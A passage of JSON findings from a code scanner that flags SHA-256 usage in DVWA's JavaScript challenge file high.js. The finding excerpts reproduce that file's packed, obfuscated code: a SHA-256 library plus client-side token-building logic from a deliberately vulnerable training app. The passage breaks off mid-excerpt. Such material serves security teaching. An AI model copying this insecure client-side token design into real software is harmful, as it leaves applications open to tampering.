        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8362,
        "endLocationLine": 1,
        "endLocationColumn": 8366
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "SHA2",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&l